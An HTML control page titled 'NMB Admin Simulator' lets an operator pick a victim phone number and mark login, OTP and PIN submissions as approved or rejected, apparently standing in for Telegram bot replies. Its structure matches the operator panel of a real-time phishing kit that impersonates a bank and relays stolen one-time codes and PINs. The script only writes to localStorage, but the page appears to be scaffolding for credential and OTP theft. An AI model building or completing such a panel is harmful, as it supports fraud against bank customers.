<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NMB Admin - Simulation Control</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        * { font-family: 'Inter', sans-serif; }
    </style>
</head>
<body class="bg-gray-100 p-6">
    <div class="max-w-md mx-auto bg-white rounded-2xl shadow-xl p-8 space-y-6">
        <h1 class="text-2xl font-black text-gray-800 border-b pb-4">NMB Admin Simulator</h1>
        
        <div class="space-y-4">
            <label class="block text-xs font-bold text-gray-400 uppercase tracking-widest">Phone Number to Control</label>
            <input type="text" id="phone" placeholder="+263771234567" class="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none font-bold">
        </div>

        <div class="grid grid-cols-2 gap-4">
            <div class="col-span-2">
                <p class="text-[10px] font-black text-gray-400 uppercase mb-2">Login Approval</p>
                <div class="flex gap-2">
                    <button onclick="setStatus('approval', 'approved')" class="flex-1 bg-green-500 text-white font-bold py-3 rounded-xl">Approve</button>
                    <button onclick="setStatus('approval', 'declined')" class="flex-1 bg-red-500 text-white font-bold py-3 rounded-xl">Decline</button>
                </div>
            </div>

            <div class="col-span-2">
                <p class="text-[10px] font-black text-gray-400 uppercase mb-2">OTP Verification</p>
                <div class="flex gap-2">
                    <button onclick="setStatus('otp_approval', 'valid')" class="flex-1 bg-green-500 text-white font-bold py-3 rounded-xl">Valid OTP</button>
                    <button onclick="setStatus('otp_approval', 'invalid')" class="flex-1 bg-red-500 text-white font-bold py-3 rounded-xl">Invalid OTP</button>
                </div>
            </div>

            <div class="col-span-2">
                <p class="text-[10px] font-black text-gray-400 uppercase mb-2">PIN Verification</p>
                <div class="flex gap-2">
                    <button onclick="setStatus('pin_approval', 'valid')" class="flex-1 bg-green-500 text-white font-bold py-3 rounded-xl">Valid PIN</button>
                    <button onclick="setStatus('pin_approval', 'invalid')" class="flex-1 bg-red-500 text-white font-bold py-3 rounded-xl">Invalid PIN</button>
                </div>
            </div>
        </div>

        <div class="pt-4 border-t text-center">
            <p class="text-[10px] text-gray-400 font-medium">Use this page in another tab to simulate Telegram bot responses.</p>
        </div>
    </div>

    <script>
        function setStatus(type, value) {
            const phone = document.getElementById('phone').value;
            if (!phone) { alert('Please enter phone number'); return; }
            localStorage.setItem(`${type}_${phone}`, value);
            alert(`${type} set to ${value} for ${phone}`);
        }
    </script>
</body>
</html>
